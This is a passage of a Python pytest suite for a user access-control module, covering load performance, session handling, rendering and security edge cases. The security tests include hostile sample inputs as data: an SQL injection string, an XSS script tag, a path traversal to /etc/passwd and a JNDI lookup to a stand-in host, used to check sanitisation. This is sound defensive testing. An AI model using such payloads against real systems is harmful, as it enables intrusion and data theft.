    """Test performance and scalability under load."""

    def test_large_user_database_performance(self, access_control):
        """Test performance with large number of users."""
        # Create many users
        start_time = time.time()
        
        for i in range(1000):
            user = MockUser(
                id=f"user_{i}",
                username=f"user_{i}",
                email=f"user_{i}@example.com",
                roles=["user"],
                groups=["staff"],
                created_at=datetime.now()
            )
            access_control.users[user.id] = user
        
        creation_time = time.time() - start_time
        assert creation_time < 5.0  # Should complete in reasonable time
        
        # Test search performance
        start_time = time.time()
        
        # Search by username
        found_user = access_control.get_user_by_username("user_500")
        assert found_user is not None
        
        # List users with filter
        staff_users = access_control.list_users(group="staff")
        assert len(staff_users) == 1000
        
        search_time = time.time() - start_time
        assert search_time < 2.0  # Should search quickly

    @pytest.mark.asyncio
    async def test_concurrent_session_management(self, access_control, sample_users):
        """Test concurrent session management."""
        user = sample_users[0]
        access_control.users[user.id] = user
        access_control.security_backend.generate_session_token.return_value = "token123"
        
        # Create many concurrent sessions
        async def create_session(session_id):
            return await access_control.create_session(
                user.id,
                ip_address=f"192.168.1.{session_id % 255}",
                user_agent=f"Agent {session_id}"
            )
        
        start_time = time.time()
        
        # Create sessions concurrently
        tasks = [create_session(i) for i in range(100)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        concurrent_time = time.time() - start_time
        
        # Check results
        successful_sessions = [r for r in results if not isinstance(r, Exception)]
        assert len(successful_sessions) == 100
        assert concurrent_time < 5.0  # Should handle concurrency efficiently

    def test_permission_checking_performance(self, access_control):
        """Test permission checking performance with complex hierarchies."""
        # Create complex role hierarchy
        roles_data = [
            ("base_user", [], ["read_basic"]),
            ("advanced_user", ["base_user"], ["read_advanced"]),
            ("power_user", ["advanced_user"], ["write_basic"]),
            ("admin_user", ["power_user"], ["write_advanced", "delete_all"]),
            ("super_admin", ["admin_user"], ["system_admin"])
        ]
        
        for role_name, parent_roles, permissions in roles_data:
            access_control.create_role(role_name, f"Role {role_name}", permissions, parent_roles)
        
        # Test permission checking performance
        start_time = time.time()
        
        for _ in range(1000):
            # Check various permissions
            access_control.role_has_permission("super_admin", "read_basic")
            access_control.role_has_permission("power_user", "write_advanced")
            access_control.role_has_permission("base_user", "system_admin")
        
        checking_time = time.time() - start_time
        assert checking_time < 1.0  # Should check permissions quickly

    def test_audit_log_performance(self, access_control):
        """Test audit log performance with large number of entries."""
        # Generate many audit logs
        start_time = time.time()
        
        for i in range(5000):
            log = AuditLog(
                id=f"log_{i}",
                timestamp=datetime.now() - timedelta(minutes=i),
                user_id=f"user_{i % 100}",
                action=f"action_{i % 10}",
                resource_type="test",
                resource_id=f"resource_{i}",
                details={"index": i}
            )
            access_control.audit_logs.append(log)
        
        creation_time = time.time() - start_time
        assert creation_time < 3.0
        
        # Test query performance
        start_time = time.time()
        
        # Various queries
        user_logs = access_control.get_audit_logs(user_id="user_50")
        action_logs = access_control.get_audit_logs(action="action_5")
        recent_logs = access_control.get_audit_logs(
            since=datetime.now() - timedelta(hours=1)
        )
        
        query_time = time.time() - start_time
        assert query_time < 1.0  # Should query quickly


class TestErrorHandlingAndSecurity:
    """Test error handling and security edge cases."""

    @pytest.mark.asyncio
    async def test_sql_injection_prevention(self, access_control):
        """Test prevention of SQL injection attacks."""
        # Attempt SQL injection in username
        malicious_username = "admin'; DROP TABLE users; --"
        
        try:
            user = access_control.get_user_by_username(malicious_username)
            assert user is None  # Should not find user
        except Exception as e:
            # Should handle safely without exposing database errors
            assert "SQL" not in str(e)

    def test_input_validation_and_sanitization(self, access_control):
        """Test input validation and sanitization."""
        # Test various malicious inputs
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "admin'--",
            "\x00\x01\x02\x03"  # Control characters
        ]
        
        for malicious_input in malicious_inputs:
            # Should either reject or sanitize input
            try:
                sanitized = access_control.sanitize_input(malicious_input)
                assert malicious_input != sanitized  # Should be sanitized
            except ValueError:
                pass  # Input rejected, which is also acceptable

    @pytest.mark.asyncio
    async def test_timing_attack_prevention(self, access_control, sample_users):
        """Test prevention of timing attacks."""
        user = sample_users[0]
        access_control.users[user.id] = user
        
        # Mock authentication with consistent timing
        access_control.security_backend.authenticate.side_effect = [None, None, user]
        access_control.security_backend.verify_password.side_effect = [False, False, True]
        
        times = []
        
        # Test authentication timing for different scenarios
        scenarios = [
            (user.username, "wrong_password"),    # Valid user, wrong password
            ("nonexistent", "any_password"),      # Invalid user
            (user.username, "correct_password")   # Valid credentials
        ]
        
        for username, password in scenarios:
            start_time = time.time()
            try:
                await access_control.authenticate_user(username, password)
            except:
                pass
            end_time = time.time()
            times.append(end_time - start_time)
        
        # Times should be similar to prevent timing attacks
        time_variance = max(times) - min(times)
        assert time_variance < 0.1  # Less than 100ms difference

    def test_session_fixation_prevention(self, access_control, sample_users):
        """Test prevention of session fixation attacks."""
        user = sample_users[0]
        access_control.users[user.id] = user
        
        # Simulate pre-existing session token
        old_token = "old_session_token"
        
        # Mock session generation to return new token
        access_control.security_backend.generate_session_token.return_value = "new_session_token"
        
        # Create session
        session = asyncio.run(access_control.create_session(
            user.id,
            ip_address="192.168.1.1",
            existing_token=old_token
        ))
        
        # Should generate new token, not reuse old one
        assert session.token != old_token

    @pytest.mark.asyncio
    async def test_privilege_escalation_prevention(self, access_control, sample_users):
        """Test prevention of privilege escalation."""
        user = sample_users[2]  # Viewer user (low privileges)
        access_control.users[user.id] = user
        
        # Attempt to escalate privileges
        malicious_updates = [
            {"roles": ["admin"]},  # Try to become admin
            {"groups": ["administrators"]},  # Try to join admin group
            {"permissions": ["delete_all"]}  # Try to add dangerous permission
        ]
        
        for update in malicious_updates:
            # Should require proper authorization
            with pytest.raises((ValueError, PermissionError)):
                await access_control.update_user(
                    user.id, 
                    **update, 
                    acting_user_id=user.id  # User trying to update themselves
                )

    def test_resource_exhaustion_protection(self, access_control):
        """Test protection against resource exhaustion attacks."""
        # Set rate limits
        access_control._rate_limits = {
            'login_attempts_per_minute': 10,
            'session_creation_per_minute': 5,
            'api_calls_per_minute': 100
        }
        
        # Test rate limiting
        user_id = "test_user"
        
        # Simulate rapid requests
        start_time = datetime.now()
        blocked_requests = 0
        
        for i in range(20):
            try:
                access_control.check_rate_limit(user_id, "login_attempts")
            except ValueError:  # Rate limit exceeded
                blocked_requests += 1
        
        # Should have blocked some requests
        assert blocked_requests > 0

    @pytest.mark.asyncio
    async def test_cryptographic_security(self, access_control):
        """Test cryptographic security measures."""
        password = "TestPassword123!"
        
        # Mock secure hashing
        access_control.security_backend.hash_password.return_value = "secure_hash_value"
        access_control.security_backend.verify_password.return_value = True
        
        # Test password hashing
        hashed = access_control.security_backend.hash_password(password)
        assert len(hashed) > 20  # Should be substantial hash
        assert hashed != password  # Should not store plaintext
        
        # Test verification
        is_valid = access_control.security_backend.verify_password(password, hashed)
        assert is_valid is True
        
        # Test session token generation
        access_control.security_backend.generate_session_token.return_value = "cryptographically_secure_token"
        token = access_control.security_backend.generate_session_token()
        assert len(token) >= 32  # Should be sufficiently long
        assert token.isalnum() or any(c in token for c in "+-_=")  # Should be base64-like


class TestRenderingAndVisualization:
    """Test rendering and visualization functionality."""

    def test_render_user_list(self, access_control, sample_users):
        """Test rendering user list."""
        for user in sample_users:
            access_control.users[user.id] = user
        
        rendered = access_control.render_user_list()
        
        assert rendered is not None
        access_control.display_renderer.create_table.assert_called()

    def test_render_role_hierarchy(self, access_control):
        """Test rendering role hierarchy."""
        # Create role hierarchy
        access_control.create_role("base", "Base Role", ["read"])
        access_control.create_role("advanced", "Advanced Role", ["write"], ["base"])
        access_control.create_role("admin", "Admin Role", ["delete"], ["advanced"])
        
        rendered = access_control.render_role_hierarchy()
        
        assert rendered is not None
        access_control.display_renderer.create_tree_view.assert_called()

    def test_render_active_sessions(self, access_control, sample_users):
        """Test rendering active sessions."""
        user = sample_users[0]
        access_control.users[user.id] = user
        
        # Create active sessions
        sessions = [
            MockSession(
                id=f"session_{i}",
                user_id=user.id,
                created_at=datetime.now() - timedelta(minutes=i*10),
                last_activity=datetime.now() - timedelta(minutes=i*5),
                ip_address=f"192.168.1.{i+1}",
                user_agent=f"Browser {i+1}"
            )
            for i in range(3)
        ]
        
        for session in sessions:
            access_control.sessions[session.id] = session
        
        rendered = access_control.render_active_sessions()
        
        assert rendered is not None

    def test_render_security_dashboard(self, access_control):
        """Test rendering security dashboard."""
        # Add some data
        access_control.audit_logs = [
            AuditLog(
                id="log1",
                timestamp=datetime.now(),
                user_id="user1",
                action="login",
                resource_type="session",
                resource_id="session1",
                details={}
            )
        ]
        
        rendered = access_control.render_security_dashboard()
        
        assert rendered is not None

    def test_render_audit_log_report(self, access_control):
        """Test rendering audit log report."""
        # Create sample audit logs
        logs = [
            AuditLog(
                id="log1",
                timestamp=datetime.now() - timedelta(hours=i),
                user_id=f"user_{i}",
                action="test_action",
                resource_type="test",
                resource_id=f"resource_{i}",
                details={"test": True}
            )
            for i in range(5)
        ]
        
        for log in logs:
            access_control.audit_logs.append(log)
        
        rendered = access_control.render_audit_report(
            since=datetime.now() - timedelta(days=1)
        )
        
        assert rendered is not None


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short", "--durations=10"])